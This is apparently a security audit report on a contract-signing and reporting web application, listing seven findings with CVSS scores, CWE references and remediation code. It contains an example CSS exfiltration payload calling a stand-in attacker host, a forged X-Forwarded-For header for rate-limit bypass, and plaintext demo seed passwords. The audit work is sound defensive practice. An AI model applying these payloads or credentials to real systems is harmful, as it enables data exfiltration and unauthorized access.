## Vulnerability Findings

### [MEDIUM] SEC-001 — Rate-Limit Bypass via Spoofed `X-Forwarded-For`

**Location:** `src/app/api/contratos/publico/[token]/route.ts:28–47`  
**CVSS Score:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)  
**OWASP Category:** A07:2021 — Identification and Authentication Failures  
**CWE:** CWE-290: Authentication Bypass by Spoofing  
**Spec-Kit Task:** TASK-SEC-001

**Description:**  
`getClientIp()` falls back to `forwardedForValues[0]` (the first value from the
`X-Forwarded-For` header) when `TRUSTED_PROXY_IPS` is not configured. An
unauthenticated attacker can forge this header (`X-Forwarded-For: 10.0.0.1`) to
supply an arbitrary IP, cycling through fake values to bypass the 10-requests/
hour rate limit on the contract-signing endpoint.

```typescript
// When TRUSTED_PROXY_IPS is empty, the condition below is always false:
if (requestIp && trustedProxyIps.includes(requestIp) && forwardedForValues.length > 0) {
  return forwardedForValues[forwardedForValues.length - 1] ?? ''
}
// Attacker controls forwardedForValues[0]:
return forwardedForValues[0] ?? requestIp ?? ''
```

While the 256-bit token makes brute-force infeasible, bypassing rate limits still
allows flooding the signing endpoint (DoS) or harassment of signatories.

**Remediation:**  
1. Document `TRUSTED_PROXY_IPS` as a **required** environment variable for
   production deployments.
2. Add a startup assertion that fails fast if `TRUSTED_PROXY_IPS` is empty in
   non-development environments:
   ```typescript
   if (process.env.NODE_ENV === 'production' && !process.env.TRUSTED_PROXY_IPS) {
     throw new Error('TRUSTED_PROXY_IPS must be set in production')
   }
   ```
3. Consider a secondary rate-limit key based on `token` (contract signing token
   is already unique per contract, so `csrf:sign:attempts:${token}` would be
   immune to IP spoofing for this endpoint).

### [MEDIUM] SEC-002 — Excessive PII Exposed in Public Contract GET Response

**Location:** `src/server/services/contract.service.ts:58–72` (`publicContractSelect`)  
**CVSS Score:** 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)  
**OWASP Category:** A02:2021 — Cryptographic Failures (sensitive data exposure)  
**CWE:** CWE-359: Exposure of Private Personal Information to an Unauthorized Actor  
**Spec-Kit Task:** TASK-SEC-002

**Description:**  
The `publicContractSelect` projection — used by the unauthenticated
`GET /api/contratos/publico/{token}` endpoint — returns the customer's `email`,
`phone`, and `address`. Anyone who receives the signing link (including if it is
accidentally forwarded) can retrieve this PII without any authentication beyond
possession of the URL.

```typescript
const publicContractSelect = {
  customer: {
    select: {
      id: true,
      name: true,
      email: true,   // ← PII not needed for signing flow
      phone: true,   // ← PII not needed for signing flow
      address: true, // ← PII not needed for signing flow
    },
  },
  ...
} as const
```

The signing page only displays `contract.customer.name`; email/phone/address are
unused in the UI but present in the JSON response.

**Remediation:**  
Restrict `publicContractSelect` to only the fields required by the public page:

```typescript
const publicContractSelect = {
  customer: {
    select: {
      id: true,
      name: true,
      // Remove: email, phone, address
    },
  },
  ...
} as const
```

### [LOW] SEC-003 — `style-src 'unsafe-inline'` Weakens Content Security Policy

**Location:** `next.config.ts:17`  
**CVSS Score:** 3.7 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N)  
**OWASP Category:** A05:2021 — Security Misconfiguration  
**CWE:** CWE-693: Protection Mechanism Failure  
**Spec-Kit Task:** TASK-SEC-003

**Description:**  
The Content Security Policy includes `style-src 'self' 'unsafe-inline'`. Allowing
inline styles enables CSS injection attacks (e.g., `background: url(https://evil.example/leak?data=...)`)
which can exfiltrate data on pages that reflect unsanitized user input into style
attributes. This is particularly relevant since contract content HTML is
user-controlled.

**Remediation:**  
Replace `'unsafe-inline'` with a nonce-based approach or hash-based CSP. For
Tailwind CSS (which uses inline style attributes), prefer using a nonce:

```typescript
// In next.config.ts, generate a per-request nonce via middleware
// and pass it to the CSP header.
"style-src 'self' 'nonce-{NONCE}'",
```

Alternatively, as a short-term measure, add `require-trusted-types-for 'script'`
to limit the attack surface.

### [LOW] SEC-004 — Missing Date-Order Validation in CSV Export Endpoint

**Location:** `src/app/api/relatorios/export/route.ts:43–57`  
**CVSS Score:** 2.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L)  
**OWASP Category:** A05:2021 — Security Misconfiguration  
**CWE:** CWE-20: Improper Input Validation  
**Spec-Kit Task:** TASK-SEC-004

**Description:**  
`/api/relatorios/export` validates that the dates are parseable (`isNaN` check)
but does not assert `from <= to`. The corresponding JSON reports endpoint
(`/api/relatorios/route.ts:52`) does enforce `if (from > to)`, creating an
inconsistency. Passing inverted dates returns an empty CSV, which is benign, but
the inconsistency introduces maintenance risk.

**Remediation:**  
Add the same guard present in the sibling route:

```typescript
if (from > to) {
  throw new UnprocessableError('Data inicial deve ser anterior à data final')
}
```

### [LOW] SEC-005 — No Maximum Date Range Cap on Report Queries

**Location:** `src/app/api/relatorios/route.ts` and `src/app/api/relatorios/export/route.ts`  
**CVSS Score:** 2.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L)  
**OWASP Category:** A05:2021 — Security Misconfiguration  
**CWE:** CWE-770: Allocation of Resources Without Limits or Throttling  
**Spec-Kit Task:** TASK-SEC-005

**Description:**  
A GERENTE user can request a report spanning years (e.g., `from=2000-01-01&to=2099-12-31`).
All four report queries (`getRevenueReport`, `getTopServices`, `getTopCustomers`,
`getStockMovementsReport`) issue unbounded `findMany` calls that return every
matching record into memory before aggregating. On a multi-tenant instance with
large datasets, this can cause memory pressure or query timeouts.

**Remediation:**  
Cap the maximum date range (e.g., 366 days):

```typescript
const MAX_RANGE_DAYS = 366
const rangeDays = (to.getTime() - from.getTime()) / (1000 * 60 * 60 * 24)
if (rangeDays > MAX_RANGE_DAYS) {
  throw new UnprocessableError(`Intervalo máximo de ${MAX_RANGE_DAYS} dias`)
}
```

### [LOW] SEC-006 — Unbounded Batch IDs Array Allows Large Database Operations

**Location:** `src/lib/validations/batch.ts:3–5`  
**CVSS Score:** 2.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L)  
**OWASP Category:** A05:2021 — Security Misconfiguration  
**CWE:** CWE-770: Allocation of Resources Without Limits or Throttling  
**Spec-Kit Task:** TASK-SEC-006

**Description:**  
`batchOSSchema` accepts any number of IDs in the `ids` array. A GERENTE could
submit thousands of IDs in a single batch request, triggering a large `IN (...)`
query and potentially a large `updateMany`. There is no pagination or upper bound
on the array.

```typescript
export const batchOSSchema = z.object({
  ids: z.array(z.string().cuid()).refine((arr) => arr.length >= 1, { ... }),
  // No .max(N) constraint
```

**Remediation:**  
Add a reasonable upper bound (e.g., 200 records per batch):

```typescript
ids: z.array(z.string().cuid())
  .min(1, 'Selecione ao menos uma OS')
  .max(200, 'Máximo de 200 registros por operação em lote'),
```

### [INFORMATIONAL] SEC-007 — Plaintext Seed Passwords Committed to Source Control

**Location:** `prisma/seed.ts:14–28`  
**CVSS Score:** 0.0 (development-only risk)  
**OWASP Category:** A07:2021 — Identification and Authentication Failures  
**CWE:** CWE-798: Use of Hard-coded Credentials  
**Spec-Kit Task:** TASK-SEC-007

**Description:**  
The seed file contains plaintext passwords for demo accounts (`Autospa@123`,
`Lava@1234`, `Func@1234`). These are correctly bcrypt-hashed (cost 12) before
storage. However, the plaintext values are visible in source control and could be
used to log in if the seed is executed against a staging/shared environment.

**Remediation:**  
- Document that `prisma/seed.ts` is for **local development only** and must
  never be run against staging/production environments.
- Optionally, load seed passwords from environment variables:
  ```typescript
  gerente: { password: process.env.SEED_GERENTE_PASSWORD ?? 'LocalDev@123' }
  ```
- Add a runtime guard in the seed script:
  ```typescript
  if (process.env.NODE_ENV === 'production') {
    throw new Error('Seed must not be run in production')
  }
  ```

The following security controls were reviewed and confirmed correct:
